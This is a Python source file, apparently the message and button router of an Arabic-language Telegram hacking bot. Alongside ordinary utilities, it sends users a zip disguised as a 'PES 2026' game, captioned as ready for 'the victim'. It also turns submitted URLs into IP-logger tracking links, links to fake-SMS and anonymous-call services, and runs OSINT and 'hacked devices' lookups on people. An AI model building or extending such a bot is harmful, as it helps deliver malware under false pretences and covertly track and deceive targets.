import os
import logging
import hashlib
import urllib.parse
import psutil
import string
import random
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from states import set_state, get_state, clear_state

# استيراد الأدوات الخاصة بك
from tools.ip_osint import ip_lookup_raw
from tools.email_osint import email_lookup_raw
from tools.domain_osint import domain_lookup_raw
from tools.username_osint import username_lookup_raw
from tools.hacked_devices import hacked_devices, process_hacked_devices_lookup
from tools.track_location import create_iplogger_link 
from tools.audio_effects import apply_hacker_effect 
from ui.panel import panel

# ====== CALLBACK (التعامل مع الأزرار) ======
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    # --- 1. خدمات النظام والمساعدة ---
    if data == "server_scan":
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        uptime = str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())).split('.')[0]
        await query.message.reply_text(f"🖥️ **موارد السيرفر:**\n🔹 CPU: `{cpu}%` | RAM: `{ram}%` \n⏱️ Uptime: `{uptime}`", parse_mode='Markdown')

    elif data == "pass_gen":
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = ''.join(random.choice(chars) for _ in range(16))
        await query.message.reply_text(f"🔐 **كلمة مرور مقترحة:**\n`{password}`", parse_mode='Markdown')

    elif data == "temp_mail_name":
        keyboard = [[InlineKeyboardButton("🌐 فتح موقع Temp Mail", url="https://temp-mail.org/ar/")]]
        await query.message.reply_text("📧 استخدم الرابط لإنشاء بريد مؤقت:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "fake_call":
        keyboard = [[InlineKeyboardButton("☎️ Globfone Call", url="https://globfone.com/call-phone/")]]
        await query.message.reply_text("☎️ إجراء مكالمة دولية مجهولة:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "fake_sms":
        keyboard = [[InlineKeyboardButton("📩 Send Fake SMS", url="https://globfone.com/send-text/")]]
        await query.message.reply_text("📩 إرسال رسالة نصية مجهولة:", reply_markup=InlineKeyboardMarkup(keyboard))

    # --- 2. خدمات OSINT والبحث ---
    elif data == "user_search":
        await set_state(user_id, "username")
        await query.message.reply_text("👤 أرسل اسم المستخدم (Username) للبحث:")

    elif data == "exif_data":
        await set_state(user_id, "waiting_for_exif_image")
        await query.message.reply_text("📊 أرسل الصورة لتحليل بيانات EXIF:")

    elif data == "img_search":
        await set_state(user_id, "waiting_for_search_image")
        await query.message.reply_text("🖼️ أرسل الصورة للبحث عن أصلها:")

    # --- 3. الخدمات الأمنية والتلغيم ---
    elif data == "virus":
        file_path = "assets/لعبة بيس 2026.zip" 
        if os.path.exists(file_path):
            await query.message.reply_document(document=open(file_path, 'rb'), caption="⚠️ **ملف جاهز للضحية.**")
        else:
            await query.message.reply_text("❌ الملف غير موجود في assets.")

    elif data == "virus_total":
        await set_state(user_id, "waiting_for_virus_file")
        await query.message.reply_text("🧬 أرسل ملفاً لفحصه رقمياً:")

    elif data == "iplogger":
        await set_state(user_id, "waiting_for_logger_url")
        await query.message.reply_text("📍 أرسل الرابط المراد تحويله لتتبع:")

    elif data == "hacked_devices":
        await set_state(user_id, "waiting_for_hacked_email")
        await hacked_devices(update, context)

    elif data == "audio_rec":
        await set_state(user_id, "waiting_for_audio")
        await query.message.reply_text("🎙️ أرسل التسجيل الصوتي لتحويله:")

    elif data == "phishing_check":
        await set_state(user_id, "waiting_for_phishing_url")
        await query.message.reply_text("🚫 أرسل الرابط لفحصه من التزوير:")

    elif data == "panel":
        await clear_state(user_id)
        await panel(update, context)

    elif data in ["ip", "domain"]:
        await set_state(user_id, data)
        await query.message.reply_text(f"🔍 أرسل الـ {data.upper()} للفحص:")

# ====== MESSAGES (التعامل مع النصوص والملفات) ======
async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = await get_state(user_id)
    if not state: return

    # --- معالجة الملفات والوسائط (صور، صوت، ملفات) ---
    media = update.message.voice or update.message.audio or update.message.document or update.message.photo
    if media:
        # 1. تحليل EXIF
        if state == "waiting_for_exif_image":
            file_id = update.message.photo[-1].file_id if update.message.photo else update.message.document.file_id
            file = await context.bot.get_file(file_id)
            img_path = f"downloads/{user_id}.jpg"
            os.makedirs("downloads", exist_ok=True)
            await file.download_to_drive(img_path)
            from tools.exif_scanner import scan_exif
            await update.message.reply_text(f"📊 **بيانات EXIF:**\n{scan_exif(img_path)}", parse_mode='Markdown')
            if os.path.exists(img_path): os.remove(img_path)
            await clear_state(user_id)
            return

        # 2. فحص VirusTotal
        elif state == "waiting_for_virus_file":
            file_id = update.message.document.file_id if update.message.document else update.message.photo[-1].file_id
            file = await context.bot.get_file(file_id)
            content = await file.download_as_bytearray()
            f_hash = hashlib.sha256(content).hexdigest()
            await update.message.reply_text(f"🧬 **البصمة:** `{f_hash}`\n🔍 [VirusTotal](https://www.virustotal.com/gui/file/{f_hash})", parse_mode='Markdown')
            await clear_state(user_id)
            return

        # 3. صوت الهكر
        elif state == "waiting_for_audio" and (update.message.voice or update.message.audio):
            status = await update.message.reply_text("⏳ جاري المعالجة...")
            audio_obj = update.message.voice or update.message.audio
            file = await context.bot.get_file(audio_obj.file_id)
            in_p, out_p = f"downloads/{user_id}_in.ogg", f"downloads/{user_id}_out.mp3"
            await file.download_to_drive(in_p)
            if apply_hacker_effect(in_p, out_p):
                with open(out_p, 'rb') as v: await update.message.reply_voice(v, caption="🛡️ تم التشفير!")
            else: await update.message.reply_text("❌ فشل التحويل.")
            for p in [in_p, out_p]: 
                if os.path.exists(p): os.remove(p)
            await clear_state(user_id)
            return

        # 4. البحث العكسي
        elif state == "waiting_for_search_image" and update.message.photo:
            file = await context.bot.get_file(update.message.photo[-1].file_id)
            google = f"https://lens.google.com/uploadbyurl?url={file.file_path}"
            await update.message.reply_text(f"🖼️ [نتائج البحث العكسي]({google})", parse_mode='Markdown')
            await clear_state(user_id)
            return

    # --- معالجة النصوص ---
    text = update.message.text.strip() if update.message.text else ""
    if not text: return

    if state == "waiting_for_logger_url":
        res = await create_iplogger_link(text)
        await update.message.reply_text(f"✅ **رابط التتبع:**\n`{res}`", parse_mode='Markdown')
    
    elif state == "waiting_for_hacked_email":
        res_text, markup = await process_hacked_devices_lookup(text)
        await update.message.reply_text(res_text, reply_markup=markup, parse_mode='Markdown')

    elif state == "waiting_for_phishing_url":
        domain = text.replace("http://", "").replace("https://", "").split('/')[0]
        vt_link = f"https://www.virustotal.com/gui/domain/{domain}"
        await update.message.reply_text(f"🛡️ **تحليل:** `{domain}`\n[تقرير VirusTotal]({vt_link})", parse_mode='Markdown')

    elif state in ["ip", "domain", "username", "leak"]:
        status = await update.message.reply_text("🔍 جاري الفحص...")
        if state == "ip": res = await ip_lookup_raw(text)
        elif state == "domain": res = await domain_lookup_raw(text)
        elif state == "username": res = await username_lookup_raw(text)
        elif state == "leak": res = await email_lookup_raw(text)
        await status.edit_text(f"✅ النتيجة:\n{res}", parse_mode='Markdown')

    await clear_state(user_id)